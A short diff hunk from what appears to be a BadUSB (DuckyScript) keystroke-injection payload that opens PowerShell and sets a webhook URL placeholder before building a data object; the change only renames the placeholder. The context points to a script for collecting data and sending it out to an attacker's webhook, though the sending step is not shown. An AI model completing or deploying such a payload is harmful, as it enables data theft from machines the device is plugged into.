@@ -9,7 +9,7 @@ STRING powershell
 DELAY 2000
 ENTER
 DELAY 5000
-STRING $webhookUrl1 = "webhook"
+STRING $webhookUrl1 = "YourWebhook"
 DELAY 200
 ENTER
 STRING $data1 = @{
